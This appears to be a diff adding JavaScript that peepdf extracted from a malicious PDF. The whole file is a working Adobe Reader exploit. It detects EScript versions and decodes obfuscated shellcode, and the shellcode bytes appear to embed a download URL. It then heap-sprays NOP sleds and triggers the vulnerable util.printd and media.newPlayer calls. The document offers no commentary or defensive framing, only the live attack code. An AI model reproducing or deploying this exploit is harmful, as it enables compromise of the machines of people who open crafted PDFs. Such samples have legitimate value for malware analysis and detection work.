@@ -1,0 +1,44 @@
+// peepdf comment: Javascript code located in object 111711 (version 0)
+
+function gogogo() {
+    util.printd('p@111111111111111111111111 : yyyy111', new Date());
+}
+var aPlugins = app.plugIns;
+for (var i = 0; i < aPlugins.length; i++) {
+    if (aPlugins[i].name == 'EScript') {
+        var lv = aPlugins[i].version;
+    }
+}
+if ((lv > 9) && (lv < 9.3)) {
+    var j = 1400;
+} else if ((lv > 8.12) && (lv < 8.2)) {
+    var j = 2900;
+} else {}
+
+// peepdf comment: Javascript code located in object 111712 (version 0)
+
+var a = '%u';
+s = new Array();
+var sh = 'Zb7FaY4eDp54EBZb7FaY4eDp758BZb7FaY4eDp8B3CZb7FaY4eDp3574Zb7FaY4eDp0378Zb7FaY4eDp56F5Zb7FaY4eDp768BZb7FaY4eDp0320Zb7FaY4eDp33F5Zb7FaY4eDp49C9Zb7FaY4eDpAD41Zb7FaY4eDpDB33Zb7FaY4eDp0F36Zb7FaY4eDp14BEZb7FaY4eDp3828Zb7FaY4eDp74F2Zb7FaY4eDpC108Zb7FaY4eDp0DCBZb7FaY4eDpDA03Zb7FaY4eDpEB40Zb7FaY4eDp3BEFZb7FaY4eDp75DFZb7FaY4eDp5EE7Zb7FaY4eDp5E8BZb7FaY4eDp0324Zb7FaY4eDp66DDZb7FaY4eDp0C8BZb7FaY4eDp8B4BZb7FaY4eDp1C5EZb7FaY4eDpDD03Zb7FaY4eDp048BZb7FaY4eDp038BZb7FaY4eDpC3C5Zb7FaY4eDp7275Zb7FaY4eDp6D6CZb7FaY4eDp6E6FZb7FaY4eDp642EZb7FaY4eDp6C6CZb7FaY4eDp4300Zb7FaY4eDp5C3AZb7FaY4eDp2E55Zb7FaY4eDp7865Zb7FaY4eDp0065Zb7FaY4eDpC033Zb7FaY4eDp0364Zb7FaY4eDp3040Zb7FaY4eDp0C78Zb7FaY4eDp408BZb7FaY4eDp8B0CZb7FaY4eDp1C70Zb7FaY4eDp8BADZb7FaY4eDp0840Zb7FaY4eDp09EBZb7FaY4eDp408BZb7FaY4eDp8D34Zb7FaY4eDp7C40Zb7FaY4eDp408BZb7FaY4eDp953CZb7FaY4eDp8EBFZb7FaY4eDp0E4EZb7FaY4eDpE8ECZb7FaY4eDpFF84Zb7FaY4eDpFFFFZb7FaY4eDpEC83Zb7FaY4eDp8304Zb7FaY4eDp242CZb7FaY4eDpFF3CZb7FaY4eDp95D0Zb7FaY4eDpBF50Zb7FaY4eDp1A36Zb7FaY4eDp702FZb7FaY4eDp6FE8Zb7FaY4eDpFFFFZb7FaY4eDp8BFFZb7FaY4eDp2454Zb7FaY4eDp8DFCZb7FaY4eDpBA52Zb7FaY4eDpDB33Zb7FaY4eDp5353Zb7FaY4eDpEB52Zb7FaY4eDp5324Zb7FaY4eDpD0FFZb7FaY4eDpBF5DZb7FaY4eDpFE98Zb7FaY4eDp0E8AZb7FaY4eDp53E8Zb7FaY4eDpFFFFZb7FaY4eDp83FFZb7FaY4eDp04ECZb7FaY4eDp2C83Zb7FaY4eDp6224Zb7FaY4eDpD0FFZb7FaY4eDp7EBFZb7FaY4eDpE2D8Zb7FaY4eDpE873Zb7FaY4eDpFF40Zb7FaY4eDpFFFFZb7FaY4eDpFF52Zb7FaY4eDpE8D0Zb7FaY4eDpFFD7Zb7FaY4eDpFFFFZb7FaY4eDp7468Zb7FaY4eDp7074Zb7FaY4eDp2F3AZb7FaY4eDp622FZb7FaY4eDp7465Zb7FaY4eDp6269Zb7FaY4eDp7A69Zb7FaY4eDp632EZb7FaY4eDp6D6FZb7FaY4eDp6E2FZb7FaY4eDp7765Zb7FaY4eDp6C2FZb7FaY4eDp702EZb7FaY4eDp7068Zb7FaY4eDp693FZb7FaY4eDp313DZb7FaY4eDp0036';
+var str = 'Zb7FaY4eDp9090Zb7FaY4eDp9090';
+sh = sh.replace(/Zb7FaY4eDp/g, a);
+str = str.replace(/Zb7FaY4eDp/g, a);
+sh = unescape(sh);
+str = unescape(str);
+while (str.length <= 0x8000) str += str;
+str = str.substr(0, 0x8000 - sh.length);
+for (i = 0; i < j; i++) {
+    s[i] = str + sh;
+}
+
+// peepdf comment: Javascript code located in object 111713 (version 0)
+
+if (j) {
+    gogogo();
+    gogogo();
+    try {
+        this.media.newPlayer(null);
+    } catch (e) {}
+    gogogo();
+}
+
